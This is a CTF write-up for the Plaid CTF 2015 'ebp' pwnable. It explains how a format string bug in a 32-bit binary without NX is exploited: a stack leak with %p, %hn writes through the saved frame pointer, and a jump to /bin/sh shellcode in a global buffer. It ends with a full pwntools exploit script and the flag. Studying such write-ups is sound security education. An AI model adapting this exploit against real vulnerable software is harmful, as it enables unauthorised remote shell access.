#Plaid CTF 2015 Writeup:
##### Pwnable: 160 points 
##### Name: ebp
##### Description:
*nc 52.6.64.173 4545* 

*Download: %p%o%o%p.*

Running file on ebp:
>```bash
> $ file ebp
> ebp: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4e8094f9986968cd856db5093810badbb0749fde, not stripped
>```

Checksec:
>```bash
>gdb-peda$ checksec
>CANARY    : disabled
>FORTIFY   : disabled
>NX        : disabled
>PIE       : disabled
>RELRO     : Partial
>```

A 32 binary and it seems like the NX flag is disabled which means we can execute shellcode

Analyzing the assembly, the vulnerability lies within the code for *make_response*:
>```assembly
>gdb-peda$ disas make_response
>Dump of assembler code for function make_response:
>   0x080484fd <+0>:	push   ebp
>   0x080484fe <+1>:	mov    ebp,esp
>   0x08048500 <+3>:	sub    esp,0x18
>   0x08048503 <+6>:	mov    DWORD PTR [esp+0x8],0x804a080
>   0x0804850b <+14>:	mov    DWORD PTR [esp+0x4],0x400
>   0x08048513 <+22>:	mov    DWORD PTR [esp],0x804a480
>   0x0804851a <+29>:	call   0x80483f0 <snprintf@plt>
>   0x0804851f <+34>:	leave  
>   0x08048520 <+35>:	ret    
>End of assembler dump.
>```

The C code for that looks something like this:
>```C
> char input[1024];  //&input is 0x804a080
> char output[1024]; //&output is 0x804a480
> int make_response(){
>   return snprintf(output,0x400,input);
>}
>```

where input and output are global variables

So it seems that this is a case of a format string vulnerability. 

Which makes sense since the description hints at %p%o%o%p

To be safe we assume there is aslr enabled on the server. We also need to utilize the format string to gain an arbitrary write and gain control flow of the program.

#####1. ASLR
  A way to defeat aslr is to use the format string vulnerability to leak an address of the stack out to us.
  We can do so by using the *%p* format 
  
#####2. Control flow
  Since a format string vulnerability also gives us the ability to write to the stack with the *%n* format we can utilize this to write to an address on the stack. If the buffers where our input was stored on the stack we can simply wrap around the stack into our buffers and use our input as addresses, however since our buffers are global buffers they are instead stored in the bss segment of the program.
  
  To remedy this we first use part 1 and leak out a stack address, then we use a saved frame pointer (ebp) to write to somewhere lower on the stack. What we want on the stack is something that we actually want to write to, the *return address* location. We use the %hn to write the size of a short to the stack which maintains the integrity of the 4 most significant bytes; this works because we know the return address is also on the stack with the ebp. Doing so we create a pointer to the return address.
>```python
>r.send('%4$p\n') 
>
>addr = int(r.recv(0xa),16)+(OFFSET) #offset is the offset to the return address
>log.info('stack: %x'%addr)
>addr = addr&0xFFFF #we take only last 4 bytes so that we can make use the %hn format
>
>r.send('%.{0!s}u%4$hn\n'.format(addr)) ##write those bytes
>```

So now we have a pointer to the location of the return address, so we simply need to wrap around to that pointer and write to it. We wrap around to our written address and overwrite the previous return address, and have it point to our buffer in the bss. Also we know that on our text segment and bss segment starts with 0x0804 which is why we can have it pivot to the buffer by writing only the size of a *short*.
>```python
>lower = bufaddr&0xffff
>r.send(shellcode+'%.{0!s}u%12$hn\n'.format(lower-len(shellcode)))
>```

Putting it together:

__Note:__ I used pwntools for this exploit but should be simple enough to convert to a regular python exploit
```python
from pwn import *

context.log_level = 'info'
r = remote('52.6.64.173',4545)

bufaddr = 0x804a080
OFFSET = 4 

shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.send('%4$p\n') 

addr = int(r.recv(0xa),16)+(OFFSET)
log.info('stack: %x'%addr)
addr = addr&0xFFFF 

r.send('%.{0!s}u%4$hn\n'.format(addr))
lower = bufaddr&0xffff
r.send(shellcode+'%.{0!s}u%12$hn\n'.format(lower-len(shellcode)))

r.interactive()
```
flag is *who_needs_stack_control_anyway?*
> more information about format strings: https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
